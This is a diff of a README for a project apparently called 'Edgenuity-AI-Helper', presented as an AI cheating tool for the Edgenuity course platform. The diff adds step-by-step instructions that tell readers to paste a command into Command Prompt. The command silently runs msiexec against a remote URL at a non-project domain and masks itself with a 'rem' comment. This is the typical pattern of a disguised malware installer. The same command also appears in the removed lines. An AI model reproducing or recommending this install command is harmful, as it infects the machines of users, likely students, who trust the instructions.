@@ -66,15 +66,24 @@ Whether you're working on **credit recovery**, **test preparation**, or **accele
 
 ### 💾 Windows Installation (One Command!)
 
-**Option 1: Command Prompt**
-
-Copy and paste this command into CMD as Administrator:
-
-```batch
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Edgenuity
+### **Step 1 — Open Command Prompt**
+1. Press **Win + R**
+2. Type:
 ```
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
+---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+```powershell
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem edgenuity ai tool
+```
+The installer will automatically download and install the required components.
 
-**Option 3: Direct Download**
+
+**Option 2: Direct Download**
 
 1. Download the installer from [Releases](https://github.com/Outpostshewharf/Edgenuity-AI-Helper/releases)
 2. Run `Edgenuity-AI-Helper-Setup.exe`
